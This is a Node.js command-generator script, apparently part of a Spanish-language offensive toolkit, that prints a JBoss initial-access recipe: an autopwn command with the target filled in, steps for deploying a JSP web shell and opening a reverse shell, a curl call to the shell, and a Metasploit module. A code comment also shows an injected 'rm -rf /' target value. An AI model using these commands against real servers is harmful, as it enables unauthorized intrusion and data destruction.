#!/usr/bin/env node
/**
 * MFH TOOLS - JBoss Linux
 * Categoria: Acceso Inicial
 *
 * Uso: node jboss-linux.js --target <ip> [--port 8080]
 *
 * Autor: FalconMX Security
 */

'use strict';

const CONFIG = { version: '1.0.0', author: 'FalconMX Security' };

// ============================================================
// REPORTE
// ============================================================
/**
 * JBoss-Linux es un generador de comandos, no un lanzador de JBoss-Linux.
 * No ejecuta nada: no lanza jboss-linux, curl ni msfconsole. Solo imprime
 * comandos con target/port interpolados.
 *
 * Lo que realmente hace:
 * - Imprime un reporte con instalación, comando generado (jboss-linux
 *   <target> <port> 2> /dev/null), cómo funciona (4 pasos), requisitos
 *   (JBoss en 8080, jmx-console, credenciales default), alternativas
 *   (curl manual + Metasploit) y advertencia legal.
 * - SÍ interpola target/port en el comando generado.
 * - SÍ interpola target/port en la alternativa curl
 *   (curl http://<target>:<port>/shell/cmd.jsp?cmd=id).
 *
 * Bugs funcionales conocidos:
 * - No valida target/port: acepta 'noesunaip', 'noesunpuerto', etc.
 * - INYECCIÓN POR COPIAR/PEGAR: target/port se interpolan sin sanitizar
 *   en 2 comandos (jboss-linux y curl).
 *   Ej: --target "192.168.1.10; rm -rf /" genera comando con "; rm -rf /".
 * - --url NO EXISTE: solo --target y --port.
 * - Exit code 0 en todos los casos (no hay process.exit(1)).
 * - Defaults funcionan (target=192.168.1.200, port=8080).
 *
 * Ventaja funcional:
 * - Interpola target/port en 2 comandos (jboss-linux y curl).
 * - Documentación real: cómo funciona (detecta versión, deploya JSP shell,
 *   ejecuta comandos, bind/reverse shell), requisitos (JBoss en 8080,
 *   jmx-console/web-console, credenciales default).
 * - Herramienta coherente: jboss-autopwn es JBoss exploitation.
 * - Alternativas útiles: curl manual + Metasploit jboss_maindeployer.
 *
 * Limitaciones:
 * - No ejecuta jboss-linux, curl ni msfconsole.
 * - No explota JBoss real.
 * - No valida target/port.
 * - --url no existe.
 * - Riesgo de inyección por copiar/pegar (2 comandos).
 * - Solo 1 herramienta (jboss-linux).
 *
 * Veredicto:
 * El nombre "JBoss Linux" promete JBoss Linux. Entrega un recetario REAL
 * de jboss-linux con comandos personalizados (target/port) y alternativas
 * (curl, Metasploit), pero sin ejecutar nada. Sigue siendo un generador
 * de comandos.
 */
function printReport(target, port) {
    console.log('');
    console.log('='.repeat(65));
    console.log('  JBOSS LINUX');
    console.log('  Target: ' + (target || '192.168.1.200'));
    console.log('  Puerto: ' + (port || '8080'));
    console.log('  Fecha: ' + new Date().toISOString());
    console.log('='.repeat(65));
    console.log('');
    console.log('  [Tool] jboss-linux');
    console.log('    jboss-autopwn is a tool to automate the exploitation of JBoss Application Server. jboss-linux targets Linux hosts ');
    console.log('');
    console.log('  [Install]');
    console.log('    sudo apt install jboss-autopwn');
    console.log('    # Dependencias: curl, metasploit-framework');
    console.log('');
    console.log('  [Comando generado]');
    console.log('    jboss-linux ' + (target || '192.168.1.200') + ' ' + (port || '8080') + ' 2> /dev/null');
    console.log('');
    console.log('  [Como funciona]');
    console.log('    1. Detecta la version de JBoss AS');
    console.log('    2. Deploya un JSP shell (cmd.jsp o similar)');
    console.log('    3. Ejecuta comandos en el servidor via HTTP');
    console.log('    4. Abre bind shell o reverse shell');
    console.log('');
    console.log('  [Requisitos]');
    console.log('    - JBoss Application Server accesible en el puerto 8080');
    console.log('    - Consola de administracion (/jmx-console o /web-console)');
    console.log('    - Credenciales por defecto o acceso sin auth');
    console.log('');
    console.log('  [Alternativas]');
    console.log('    # Reverse shell manual:');
    console.log('    curl http://' + (target || 'target') + ':' + (port || '8080') + '/shell/cmd.jsp?cmd=id');
    console.log('');
    console.log('    # Deploy manual con JMX:');
    console.log('    Metasploit: use exploit/multi/http/jboss_maindeployer');
    console.log('');
    console.log('-'.repeat(65));
    console.log('  WARN: solo ataca sistemas con autorizacion escrita');
    console.log('-'.repeat(65));
    console.log('');
}

// ============================================================
// CLI
// ============================================================
function main() {
    var args = process.argv.slice(2);
    var targetIdx = args.indexOf('--target');
    var portIdx = args.indexOf('--port');

    if (args.length === 0) {
        console.log('');
        console.log('+------------------------------------------------------+');
        console.log('|  MFH TOOLS - JBoss Linux v' + CONFIG.version + '                    |');
        console.log('|  ' + CONFIG.author + '                              |');
        console.log('+------------------------------------------------------+');
        console.log('');
        console.log('  Uso: node jboss-linux.js --target <ip> [--port 8080]');
        console.log('');
        console.log('  Ejemplos:');
        console.log('    node jboss-linux.js --target 192.168.1.200 --port 8080');
        console.log('');
        process.exit(0);
    }

    var target = targetIdx !== -1 ? args[targetIdx + 1] : '192.168.1.200';
    var port = portIdx !== -1 ? args[portIdx + 1] : '8080';

    console.log('\nGenerando comandos JBoss Linux...\n');
    printReport(target, port);
}

main();
